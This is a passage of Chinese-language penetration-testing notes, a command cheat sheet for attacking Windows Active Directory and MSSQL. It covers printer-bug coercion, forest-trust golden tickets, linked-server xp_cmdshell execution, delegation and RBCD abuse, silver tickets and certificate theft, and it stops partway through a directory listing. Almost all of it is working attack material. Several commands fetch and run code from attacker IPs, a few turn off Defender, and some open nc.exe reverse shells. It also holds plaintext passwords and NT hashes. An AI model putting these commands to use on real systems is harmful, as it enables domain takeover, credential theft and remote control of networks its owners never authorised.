+<h4 id="森林打印机"><a href="#森林打印机" class="headerlink" title="森林打印机"></a>森林打印机</h4><pre><code>//查询打印服务是否开启
+PS C:\Tools&gt; ls \\rdc01\pipe\spoolss
+//需要本地管理员权限，抓取票据，拿到的是RDC01$机器的票据
+C:\Tools&gt; Rubeus.exe monitor /interval:5 /filteruser:RDC01$ /nowrap
+//SpoolSample 触发
+PS C:\Tools&gt; .\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
+PS C:\Tools&gt; iex(new-object
+net.webclient).downloadstring(&#39;http://192.168.45.192/InvokeSpoolsample.ps1&#39;);Invoke-Spoolsample -Command &quot;rdc01 appsrv01&quot;
+//导入票据
+C:\Tools&gt; Rubeus.exe ptt
+/ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...
+
+mimikatz # lsadump::dcsync /domain:corp1.com /user:corp1\administrator
+</code></pre>
+<h4 id="森林"><a href="#森林" class="headerlink" title="森林"></a>森林</h4><p>ExtraSID：类似于子域到父域的ExtraSIDs，但是519访问被禁止 在corp2.com需要用管理员权限开启 SID history</p>
+<pre><code> netdom trust corp2.com /d:corp1.com /enablesidhistory:yes
+</code></pre>
+<pre><code>//如果有TREAT_AS_EXTERNAL权限 表示启用 SID 历史记录
+PS C:\tools&gt; Get-DomainTrust -Domain corp2.com
+
+TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE
+</code></pre>
+<pre><code>//枚举 corp2.com 内置管理员组的成员，查找sid超过1000的组
+PS C:\tools&gt; Get-DomainGroupMember -Identity &quot;Administrators&quot; -Domain corp2.com
+
+//查询2个域的sid
+PS C:\Tools&gt; Get-DomainSID -domain corp1.com
+S-1-5-21-1587569303-1110564223-1586047116
+PS C:\Tools&gt; Get-DomainSID -domain corp2.com
+S-1-5-21-3759240818-3619593844-2110795065
+
+//获取krbtgt hash
+mimikatz # lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt
+
+//利用corp1得到krbtgt的hash制作黄金票据，sids的后缀使用超过1000的在corp2中Administrators的组
+mimikatz # kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:6b1bca4a1f7dbd67e28d3491290e4cb3 /sids:S-1-5-21-3759240818-3619593844-2110795065-1106 /ptt
+
+mimikatz # kerberos::golden /user:&lt;fake user&gt; /domain:&lt;current domain&gt; /sid:
+&lt;current domain sid&gt; /krbtgt:&lt;krbtgt hash&gt; /sids:&lt;target domain&gt;-&lt;group id&gt;
+/ptt
+
+//获取corp2域内机器，然后横向
+PS C:\Tools&gt; Get-DomainComputer -domain corp2.com | Select-Object -
+ExpandProperty samaccountname
+PS C:\Tools&gt; dir \\dc01.corp2.com\c$
+</code></pre>
+<h4 id="SQL："><a href="#SQL：" class="headerlink" title="SQL："></a>SQL：</h4><p>枚举：</p>
+<pre><code>setspn -T corp2.com -Q MSSQLSvc/*
+</code></pre>
+<p>查询可以 execute as到哪些账号：</p>
+<pre><code>SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39;
+</code></pre>
+<p>模拟用户：</p>
+<pre><code>EXECUTE AS LOGIN = &#39;sa&#39;;
+use msdb; EXECUTE AS USER = &#39;dbo&#39;;
+</code></pre>
+<p>查询哪些用户有linked server的权限</p>
+<pre><code>SELECT SP.name AS [Server Principal],SS.name AS [Linked Server] FROM sys.server_principals SP JOIN sys.linked_logins LL ON SP.principal_id = LL.local_principal_id JOIN sys.servers SS ON LL.server_id = SS.server_id
+</code></pre>
+<p>EXPLOIT：</p>
+<pre><code>EXECUTE AS LOGIN = &#39;sa&#39;;
+EXEC sp_linkedservers;
+select * from master..sysservers;
+</code></pre>
+<p>开启目标RPC：</p>
+<pre><code>EXEC sp_serveroption &#39;SQL03&#39;, &#39;rpc out&#39;, &#39;true&#39;;
+
+EXEC(&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure;&#39;) AT DC01；
+EXEC(&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; RECONFIGURE;&#39;) AT [HFDC\PRODUCTION];
+exec(&#39;xp_cmdshell &#39;&#39;whoami /all&#39;&#39;&#39;) AT [HFDC\PRODUCTION];
+
+select version from openquery([HFDC\PRODUCTION], &#39;select @@version as
+version&#39;);
+select * from openquery([HFDC\PRODUCTION] ,&#39;SELECT name FROM
+master..sysdatabases&#39;);
+exec(&#39;sp_linkedservers&#39;) AT [HFDC\PRODUCTION];
+</code></pre>
+<pre><code>EXECUTE as LOGIN = &#39;sa&#39;;EXEC sp_serveroption &#39;SQL03&#39;, &#39;rpc out&#39;, &#39;true&#39;;EXEC (&#39;sp_configure&#39;&#39;show advanced options&#39;&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; RECONFIGURE;&#39;) AT SQL03;EXEC(&#39;xp_cmdshell &#39;&#39;whoami&#39;&#39;;&#39;) AT SQL03
+
+EXECUTE(&#39;xp_cmdshell &#39;&#39;powershell wget http://192.168.45.228/GodPotato4.exe -OutFile c:\\users\public\potato.exe&#39;&#39; &#39;) AT [SQL03]
+EXECUTE(&#39;xp_cmdshell &#39;&#39; c:\users\public\potato.exe -cmd &quot;powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -Verbose&quot;&#39;&#39; &#39;) AT [SQL03]
+SQL&gt; EXECUTE(&#39;xp_cmdshell &#39;&#39;powershell wget http://192.168.45.228/reverse.exe -o C:\Users\Public\reverse.exe;. C:\Users\Public\reverse.exe&#39;&#39; &#39;) AT [SQL03]
+</code></pre>
+<p>xpcmd其他RCE：</p>
+<pre><code>EXECUTE AS LOGIN = &#39;sa&#39;;
+EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1; RECONFIGURE;
+DECLARE @myshell INT; EXEC sp_oacreate &#39;wscript.shell&#39;, @myshell OUTPUT; EXEC sp_oamethod @myshell, &#39;run&#39;, null, &#39;powershell -enc
+KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGU
+AbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5AD
+IALgAxADYAOAAuADQANQAuADIANAA0AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA&#39;;
+</code></pre>
+<h4 id="强制认证："><a href="#强制认证：" class="headerlink" title="强制认证："></a>强制认证：</h4><pre><code>#SCF:
+[Shell]
+Command=2
+IconFile=\\192.168.1.115\tools\nc.ico
+[Taskbar]
+Command=ToggleDesktop
+
+#URL:
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\192.168.1.4\%USERNAME%.icon
+IconIndex=1
+
+#RTF：
+{\rtf1{\field{\*\fldinst {INCLUDEPICTURE &quot;file://192.168.1.115/test.jpg&quot; \\* MERGEFORMAT\\d}}{\fldrslt}}}
+
+#XML:
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
+&lt;?mso-application progid=&quot;Word.Document&quot;?&gt;
+&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;\\192.168.1.115\bad.xsl&quot; ?&gt;
+
+#HTML:
+&lt;img src=&quot;file://10.10.16.3/a.jpg&quot; /&gt;
+
+#windows defender
+cmd /C C:\Users\&quot;All Users&quot;\Microsoft\&quot;Windows Defender&quot;\platform\4.18.2010.7-0\X86\MpCmdRun.exe -Scan  -ScanType 3 -File \\10.14.24.91\hello\win.exe
+</code></pre>
+<h4 id="会话接管"><a href="#会话接管" class="headerlink" title="会话接管"></a>会话接管</h4><p>注意:Windows Server 2019 不允许您在不知道密码的情况下连接到其他用户的会话。</p>
+<pre><code class="bat">C:\&gt; query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+&gt;administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
+ luke                                    3  Disc            .  4/6/2022 6:51 AM
+</code></pre>
+<pre><code class="bat">tscon 3 /dest:rdp-tcp#6
+</code></pre>
+<h4 id="3389"><a href="#3389" class="headerlink" title="3389"></a>3389</h4><pre><code class="bash">#开启
+REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&quot; /v UserAuthentication /t REG_DWORD /d &quot;0&quot; /f
+#关闭：
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
+
+#利用Hash登录RDP:在抓取hash无法破解的情况下，使用hash远程登录RDP，需要开启&quot;Restricted Admin Mode&quot; 在windows8.1和windows server 2012 r2上默认开启。可以修改注册表，0为开启，1为关闭：
+REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+#查询是否开启：
+REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;
+
+
+#或者用powershell
+New-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot; -Name &quot;DisableRestrictedAdmin&quot; -Value &quot;0&quot; -PropertyType DWORD -Force
+</code></pre>
+<h4 id="Linux缓存票据："><a href="#Linux缓存票据：" class="headerlink" title="Linux缓存票据："></a>Linux缓存票据：</h4><pre><code>offsec@linuxvictim:~$ sudo cp /tmp/krb5cc_607000500_3aeIA5
+/tmp/krb5cc_minenow
+offsec@linuxvictim:~$ kdestroy
+offsec@linuxvictim:~$ export KRB5CCNAME=/tmp/krb5cc_minenow
+offsec@linuxvictim:~$ kvno MSSQLSvc/DC01.corp1.com:1433 
+//根据上述查询结果，使用kvno 来请求MSSQL SPN的服务票据
+</code></pre>
+<h4 id="Ntlmrelayx："><a href="#Ntlmrelayx：" class="headerlink" title="Ntlmrelayx："></a>Ntlmrelayx：</h4><pre><code class="bat">ntlmrelayx.py -t 172.16.214.152 --no-http-server -smb2support -c &#39;whoami&#39;
+[*] Executed specified command on host: 172.16.214.152
+nt authority\system
+</code></pre>
+<h4 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h4><pre><code class="bat">#查找委派
+findDelegation.py &quot;DOMAIN&quot;/&quot;USER&quot;:&quot;PASSWORD&quot;
+#特定账户的委派：
+findDelegation.py -user &quot;account&quot; &quot;DOMAIN&quot;/&quot;USER&quot;:&quot;PASSWORD&quot;
+
+#pwoershell
+Get-ADComputer &quot;Account&quot; -Properties TrustedForDelegation, TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,PrincipalsAllowedToDelegateToAccount
+</code></pre>
+<p><strong>非约束委派：</strong></p>
+<p>枚举非约束委派：</p>
+<pre><code>Get-DomainComputer -Unconstrained
+</code></pre>
+<p>Administrator在非约束性委派缓存票据：</p>
+<pre><code>mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets
+mimikatz # sekurlsa::tickets /export
+mimikatz # kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgtPROD.CORP1.COM.kirbi
+mimikatz # exit
+</code></pre>
+<p>打印机漏洞：</p>
+<pre><code>Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
+</code></pre>
+<pre><code>#切换system
+PsExec64.exe -accepteula -s -i cmd.exe
+</code></pre>
+<pre><code>#在system窗口中启动：
+SpoolSample.exe dc03 web05
+</code></pre>
+<pre><code>Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
+</code></pre>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:infinity.com /user:infinity\administrator&quot; &quot;exit&quot; &gt; mimi.txt
+</code></pre>
+<p>linux：</p>
+<pre><code># 1. 为用户设置SPN
+addspn.py -u &#39;DOMAIN\CompromisedAccont&#39; -p &#39;LMhash:NThash&#39; -s &#39;HOST/attacker.DOMAIN_FQDN&#39; --additional &#39;DomainController&#39;
+
+# 2. 为机器账户设置SPN
+dnstool.py -u &#39;DOMAIN\CompromisedAccont&#39; -p &#39;LMhash:NThash&#39; -r &#39;attacker.DOMAIN_FQDN&#39; -d &#39;attacker_IP&#39; --action add &#39;DomainController&#39;
+
+# 3. 启用监听器
+krbrelayx.py --krbsalt &#39;DOMAINusername&#39; --krbpass &#39;password&#39;
+
+# 4. Authentication coercion
+# PrinterBug, PetitPotam, PrivExchange, ...
+</code></pre>
+<p><strong>约束委派</strong>：</p>
+<pre><code>//生成密码的nt hash
+PS C:\Tools&gt; .\Rubeus.exe hash /password:lab
+//为iissvc请求tgt
+PS C:\Tools&gt; .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com
+/rc4:2892D26CDF84D7A70E2EB3B9F05C425E /nowrap
+//调用 S4U 扩展生成administrator对mssqlsvc权限的票据。其中administrator这个用户
+名需要猜测
+PS C:\Tools&gt; .\Rubeus.exe s4u /ticket:doIE+jCCBP...
+/impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
+
+#一步注入票据
+.\Rubeus.exe s4u /user:iissvc /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
+
+.\Rubeus.exe s4u /ticket:doIE+jCCBPag...
+/impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433
+/altservice:CIFS /ptt
+</code></pre>
+<pre><code>getST -spn &quot;cifs/target&quot; -impersonate &quot;administrator&quot; &quot;domain/service:password&quot;
+</code></pre>
+<pre><code>getST -spn &quot;cifs/serviceA&quot; -impersonate &quot;administrator&quot; &quot;domain/serviceB:password&quot;
+</code></pre>
+<pre><code>getST.py -spn &#39;www/dc.intelligence.htb&#39; -impersonate administrator intelligence.htb/svc_int$ -hashes :67065141d298d67a17ee8626476b20f9 -dc-ip 10.10.10.248 
+</code></pre>
+<p><strong>基于资源的约束委派</strong></p>
+<pre><code>. .\PowerView.ps1
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | AddMember -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $(&quot;$env:UserDomain\$env:Username&quot;)) {$_}}
+</code></pre>
+<p>枚举剩余添加机器的数量：</p>
+<pre><code>Get-DomainObject -Identity prod -Properties ms-DSMachineAccountQuota
+</code></pre>
+<p>检测已经设置了RBCD的机器</p>
+<pre><code>$Computer = Get-DomainComputer -LDAPFilter &quot;(msdsallowedtoactonbehalfofotheridentity=*)&quot; | Select-Object -ExpandProperty Name; $RBCDbytes = Get-DomainComputer $Computer -Properties &#39;msdsallowedtoactonbehalfofotheridentity&#39; | Select-Object -ExpandProperty msdsallowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0; $Sid = $Descriptor.DiscretionaryAcl | Select-Object -ExpandProperty SecurityIdentifier; $ATTACK = ConvertFrom-SID $Sid; Write-Host &quot;&gt;&gt;$ATTACK&lt;&lt; can do RBCD to &gt;&gt;$Computer&lt;&lt;!&quot;
+</code></pre>
+<p>本地RBCD利用：</p>
+<pre><code>. .\Powermad.ps1
+. .\PowerView.ps1
+//增加机器账号
+New-MachineAccount -MachineAccount &lt;newComputer&gt; -Password $(ConvertTo-SecureString &#39;h4x&#39; -AsPlainText -Force)
+$sid =Get-DomainComputer -Identity &lt;newComputer&gt; -Properties objectsid | Select
+-Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList
+&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))&quot;
+$SDbytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDbytes,0)
+Get-DomainComputer -Identity &lt;victim&gt; | Set-DomainObject -Set @{&#39;msdsallowedtoactonbehalfofotheridentity&#39;=$SDBytes}
+
+//check
+$RBCDbytes = Get-DomainComputer &lt;victim&gt; -Properties &#39;msdsallowedtoactonbehalfofotheridentity&#39; | select -expand msdsallowedtoactonbehalfofotheridentity
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
+$Descriptor.DiscretionaryAcl 
+ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier
+</code></pre>
+<p>或者直接加载脚本：</p>
+<pre><code>iex(new-object system.net.webclient).downloadstring(&#39;http://192.168.45.192/Invoke-Rbcd.ps1&#39;)
+</code></pre>
+<pre><code>function Invoke-Rbcd {
+    $ip=&#39;192.168.45.192&#39;
+    $urlPowerView = &#39;http://&#39;+$ip+&#39;/PowerView.ps1&#39;
+    $urlPowermad = &#39;http://&#39;+$ip+&#39;/Powermad.ps1&#39;
+    $attacksys = &#39;newComputer&#39;
+    $victimsys = &#39;appsrv01&#39;
+    
+    (new-object net.webclient).DownloadString($urlPowerView) | IEX
+    (new-object net.webclient).DownloadString($urlPowermad) | IEX
+
+    New-MachineAccount -MachineAccount $attacksys -Password $(ConvertToSecureString &#39;Password1#&#39; -AsPlainText -Force)
+
+    $sid =Get-DomainComputer -Identity $attacksys -Properties objectsid |
+Select -Expand objectsid
+
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList
+&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))&quot;
+
+    $SDbytes = New-Object byte[] ($SD.BinaryLength)
+    
+    $SD.GetBinaryForm($SDbytes,0)
+    
+    Get-DomainComputer -Identity $victimsys | Set-DomainObject -Set @{&#39;msdsallowedtoactonbehalfofotheridentity&#39;=$SDBytes}
+    
+#Check
+
+    $RBCDbytes = Get-DomainComputer $victimsys -Properties &#39;msdsallowedtoactonbehalfofotheridentity&#39; | select -expand msdsallowedtoactonbehalfofotheridentity
+    
+    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -
+ArgumentList $RBCDbytes, 0
+
+    $Descriptor.DiscretionaryAcl
+    
+    ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier
+}
+Invoke-Rbcd
+</code></pre>
+<p>使用 S4U 扩展为 appsrv01 请求 CIFS的TGS：</p>
+<pre><code>.\Rubeus.exe hash /password:Password1!
+[*] Input password : Password1!
+[*] rc4_hmac : 7FACDC498ED1680C4FD1448319A8C04F
+PS C:\tools&gt; .\Rubeus.exe s4u /user:newComputer$ /rc4:7FACDC498ED1680C4FD1448319A8C04F /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
+PS C:\tools&gt; dir \\appsrv01.prod.corp1.com\c$
+</code></pre>
+<p>Exploit by SPN Account</p>
+<pre><code>iex(new-object net.webclient).downloadstring(&#39;http://10.10.16.91/InvokeRbcdspn.ps1&#39;)
+</code></pre>
+<pre><code class="powershell">function Invoke-Rbcdspn {
+    $ip=&#39;10.10.16.91&#39;
+    $urlPowerView = &#39;http://&#39;+$ip+&#39;/PowerView.ps1&#39;
+    $domain = &#39;m3c.local&#39;
+    $attackspn = &#39;svc_apache&#39;
+    $attackspnpwd = &#39;ef8Mahvae2j2&#39;
+    $victimsys = &#39;m3dc&#39;
+    
+    (new-object net.webclient).DownloadString($urlPowerView) | IEX
+    
+    $sid =Get-DomainUser -Identity $attackspn -Properties objectsid | Select -
+Expand objectsid
+
+    $SecPassword = ConvertTo-SecureString $attackspnpwd -AsPlainText -Force
+    
+    $Cred = New-Object System.Management.Automation.PSCredential(&#39;$domain\$attackspn&#39;, $SecPassword)
+    
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList
+&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))&quot;
+    
+    $SDbytes = New-Object byte[] ($SD.BinaryLength)
+    
+    $SD.GetBinaryForm($SDbytes,0)
+    
+    Get-DomainComputer -Identity $victimsys | Set-DomainObject -Set @{&#39;msdsallowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose -Credential $Cred
+#Check
+    $RBCDbytes = Get-DomainComputer $victimsys -Properties &#39;msdsallowedtoactonbehalfofotheridentity&#39; | select -expand msdsallowedtoactonbehalfofotheridentity
+    
+    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
+    
+    $Descriptor.DiscretionaryAcl
+    
+    $Descriptor.DiscretionaryAcl.SecurityIdentifier
+    
+    ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier
+}
+Invoke-Rbcdspn
+</code></pre>
+<pre><code>impacket-addcomputer -computer-name &#39;myComputer$&#39; -computer-pass &#39;h4x&#39; corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+</code></pre>
+<pre><code>impacket-rbcd -action write -delegate-to &quot;BACKUP01$&quot; -delegate-from &quot;myComputer$&quot; corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+</code></pre>
+<pre><code>impacket-getST -spn cifs/backup01.corp.com -impersonate administrator &#39;corp.com/myComputer$:h4x&#39;
+</code></pre>
+<pre><code>impacket-psexec administrator@backup01.corp.com -k -no-pass
+</code></pre>
+<h4 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h4><p>定义票据环境变量：</p>
+<pre><code>export KRB5CCNAME=$path_to_ticket.ccache
+</code></pre>
+<p>票据格式转换：</p>
+<pre><code># Windows -&gt; UNIX
+ticketConverter.py $ticket.kirbi $ticket.ccache
+# UNIX -&gt; Windows
+ticketConverter.py $ticket.ccache $ticket.
+</code></pre>
+<p>金票：</p>
+<pre><code># Create the golden ticket (with an RC4 key, i.e. NT hash)
+ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN administrator
+
+# Create the golden ticket (with an AES 128/256bits key)
+ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN administrator
+
+impacket-ticketer -nthash cce9d6cd94eb31ccfbb7cc8eeadf7ce1 -domain prod.corp1.com -domain-sid S-1-5-21-634106289-3621871093-708134407 administrator
+
+
+#windows用mimikatz：
+mimikatz.exe &quot;lsadump::dcsync /domain:domain.com /user:krbtgt&quot; exit
+#制作黄金票据：
+kerberos::golden /user:Administrator /domain:domain /sid:sid /krbtgt:hash
+# with an AES 128 key
+kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt
+# with an AES 256 key
+kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
+
+ kerberos::golden /admin:Administrator /domain:prod.corp1.com /sid:S1-5-21-634106289-3621871093-708134407 /krbtgt:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /ticket:Administrator1.kiribi
+#检测
+dir \\$domain_name\c$\
+
+#制作信任票据：
+kerberos::golden /user:h4x /domain:ops.comply.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519
+
+#制作父域的黄金票据
+kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /krbtgt:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /ptt
+</code></pre>
+<p>银票：</p>
+<pre><code># with an NT hash
+python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
+
+# with an AES (128 or 256 bits) key
+python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
+
+#windows：
+# with an NT hash
+kerberos::golden /user:&lt;domain user&gt; /domain:&lt;domain&gt; /sid:&lt;domain sid&gt;
+/target:&lt;service machine&gt; /service:cifs,ldap,.. /rc4:&lt;service hashes&gt; /ptt
+
+# with an AES 128 key
+kerberos::golden /user:&lt;domain user&gt; /domain:&lt;domain&gt; /sid:&lt;domain sid&gt;
+/target:&lt;service machine&gt; /service:cifs,ldap,.. /aes128:$krbtgt_aes128_key&gt; /ptt 
+
+# with an AES 256 key
+kerberos::golden /user:&lt;domain user&gt; /domain:&lt;domain&gt; /sid:&lt;domain sid&gt;
+/target:&lt;service machine&gt; /service:cifs,ldap,.. /aes256:$krbtgt_aes128_key&gt; /ptt 
+
+#使用 mimikatz 将票据注入内存：
+kerberos::ptt Administrator.kiribi
+#PsExec 检测：
+PsExec.exe \\dc -s cmd
+</code></pre>
+<h4 id="用户模仿："><a href="#用户模仿：" class="headerlink" title="用户模仿："></a>用户模仿：</h4><pre><code>#填充 Active Directory 帐户的密码时，`/netonly`必须设置标志以指示凭据仅用于远程访问。
+runas /netonly /user:$DOMAIN\$USER &quot;powershell.exe&quot;
+runas /savecred /user:WORKGROUP\Administrator &quot;\\10.XXX.XXX.XXX\SHARE\evil.exe&quot;
+runas /user:ACCESS\Administrator /savecred &quot;powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.16.8:80/a&#39;)&quot;
+C:\Windows\System32\runas.exe /env /noprofile /user:&lt;username&gt; &lt;password&gt; &quot;c:\users\Public\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe&quot;
+</code></pre>
+<pre><code>#在powershell中可以创建新的凭据对象用来模拟用户：
+$credential = Get-Credential
+$password = ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential(&#39;FQDN.DOMAIN\user_to_run_as&#39;, $password)
+Start-Process Notepad.exe -Credential $credential
+</code></pre>
+<pre><code class="bat">#PowerView的大多数函数都有`-Credential`,`-Domain`和`-Server`参数，可用于明确指定要运行的用户、目标域和目标域控制器。就像之前的“Powershell”选项卡一样，-Credential 选项必须提供一个凭据对象
+# Credential object creation (not prompted)
+$password = ConvertTo-SecureString &#39;pasword_of_user_to_run_as&#39; -AsPlainText -Force
+
+$credential = New-Object System.Management.Automation.PSCredential(&#39;FQDN.DOMAIN\user_to_run_as&#39;, $password)
+Set-DomainObject -Credential $Cred -Domain &#39;FQDN.DOMAIN&#39; -Server &#39;Domain_Controller&#39; -Identity &#39;victimuser&#39; -Set @{serviceprincipalname=&#39;nonexistant/BLAHBLAH&#39;}
+
+$User = Get-DomainUser -Credential $Cred -Domain &#39;FQDN.DOMAIN&#39; -Server &#39;Domain_Controller&#39; &#39;victimuser&#39;
+$User | Get-DomainSPNTicket -Credential $Cred -Domain &#39;FQDN.DOMAIN&#39; -Server &#39;Domain_Controller&#39; | fl
+
+$username=&quot;Administrator&quot;
+$password=&quot;A7b0s425w.5[81&quot;
+$pw = ConvertTo-SecureString $password -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ($username, $pw)
+Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart
+/tn shell /tr C:\Users\Public\shell.exe /ru SYSTEM } -Credential $creds
+Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -
+Credential $creds
+
+$username=&quot;Administrator&quot;
+$password=&quot;A7b0s425w.5[81&quot;
+$pw = ConvertTo-SecureString $password -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ($username, $pw) Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $creds -ArgumentList (&quot;192.168.1.1&quot;,&quot;443&quot;,&quot;-e&quot;,&quot;cmd.exe&quot;) -WorkingDirectory
+</code></pre>
+<h4 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS:"></a>ADCS:</h4><p>枚举证书模板：</p>
+<pre><code>certutil -v -template &gt; cert_templates.txt
+</code></pre>
+<p>Template[X]表示模板序列号，如果要单独查看某一个模板可以通过序列号快速筛选。一共三个参数作为参考：</p>
+<p>1：<em><strong>Allow Enroll</strong></em> or *<strong>Allow Full Control*</strong> 允许注册与完全访问。</p>
+<p>2：确保证书具有客户端认证EKU：EKU可用于认证kerberos</p>
+<p>3：如果***CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT***标志为1，则表示客户端可以制定SAN：指定主题备用名称 (SAN)。SAN 通常类似于我们要加密的网站的 URL。例如：tryhackme.com。但是，如果我们有能力控制 SAN，我们可以利用证书为我们选择的任何 AD 帐户实际生成 kerberos 票证！</p>
+<p>用户模拟：利用证书模拟用户</p>
+<pre><code>Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:&lt;path to certificate&gt; /password:&lt;certificate file password&gt; /outfile:&lt;name of file to write TGT to&gt; /domain:lunar.eruca.com /dc:&lt;IP of domain controller&gt;
+</code></pre>
+<p>证书持久性：</p>
+<p>查看存储证书：</p>
+<pre><code>mimikatz:# crypto::certificates /systemstore:local_machine
+</code></pre>
+<p>导出证书秘钥：</p>
+<pre><code>mimikatz # privilege::debug
+Privilege &#39;20&#39; OK
+
+mimikatz # crypto::capi
+Local CryptoAPI RSA CSP patched
+Local CryptoAPI DSS CSP patched
+
+mimikatz # crypto::cng
+&quot;KeyIso&quot; service patched
+
+mimikatz # crypto::certificates /systemstore:local_machine /export
+</code></pre>
+<p>导出的证书将以 PFX 和 DER 格式存储到磁盘：</p>
+<pre><code>za\administrator@THMDC C:\Users\Administrator.ZA\am0&gt;dir
+ Volume in drive C is Windows
+ Volume Serial Number is 1634-22A9
+
+ Directory of C:\Tools\x64
+
